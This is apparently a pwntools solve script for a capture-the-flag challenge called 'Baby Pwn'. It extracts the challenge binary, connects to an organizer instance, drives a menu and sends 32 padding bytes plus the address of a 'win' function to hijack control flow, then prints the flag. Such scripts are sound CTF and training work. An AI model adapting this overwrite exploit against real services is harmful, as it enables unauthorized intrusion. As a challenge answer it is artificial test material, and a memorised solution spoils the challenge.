#!/usr/bin/env python3
import argparse
from pathlib import Path
import re

from pwn import ELF, context, p64, remote

BINARY = Path(__file__).resolve().parent / "work" / "chall"

import zipfile
def _ensure_binary():
    if not BINARY.exists():
        BINARY.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(Path(__file__).resolve().parent / "files" / "handout.zip") as zf:
            BINARY.write_bytes(zf.read("chall"))


def main():
    parser = argparse.ArgumentParser(description="Solve Baby Pwn")
    parser.add_argument("host", help="organizer instance hostname")
    parser.add_argument("port", type=int, help="organizer instance port")
    args = parser.parse_args()
    _ensure_binary()

    context.log_level = "error"
    win = ELF(BINARY, checksec=False).sym["win"]
    io = remote(args.host, args.port, ssl=True, sni=args.host, timeout=10)
    try:
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"Review: ", b"A review that stays favourite")
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"Draft length (1-40): ", b"40")
        io.sendafter(b"Send exactly 40 draft bytes: ", b"A" * 32 + p64(win))
        io.sendlineafter(b"> ", b"5")
        output = io.recvall(timeout=3)
        match = re.search(rb"FortID\{[^}\r\n]+\}", output)
        if not match:
            raise RuntimeError(f"flag not found in service response: {output!r}")
        print(match.group().decode())
    finally:
        io.close()


if __name__ == "__main__":
    main()
